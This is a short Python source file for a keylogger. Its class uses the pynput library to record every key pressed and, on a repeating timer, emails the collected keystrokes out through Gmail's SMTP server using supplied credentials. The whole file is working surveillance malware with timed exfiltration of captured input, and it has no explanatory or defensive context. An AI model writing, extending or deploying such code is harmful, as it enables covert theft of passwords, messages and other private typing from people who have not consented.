#!/usr/bin/env python

from pynput import keyboard
import threading
import smtplib



class Key_tyan():

    def __init__(self, time, email,password):
        self.data = "it's started!"
        self.interval = time
        self.email = email
        self.password = password

    def append_to_data(self, string):
        self.data = self.data + string

    def procces_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = "\t"
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        self.append_to_data(current_key)


    def response(self):
        self.send_email(self.email, self.password, "\n\n" + self.data)
        self.data = ""
        timer = threading.Timer(self.interval, self.response)
        timer.start()

    def send_email(self,mail, password, message):
        host = smtplib.SMTP("smtp.gmail.com", 587)
        host.starttls()
        host.login(mail, password)
        host.sendmail(mail, mail, message)
        host.quit()
    def go(self):
        key_listener = keyboard.Listener(on_press=self.procces_press)
        with key_listener:
            self.response()
            key_listener.join()
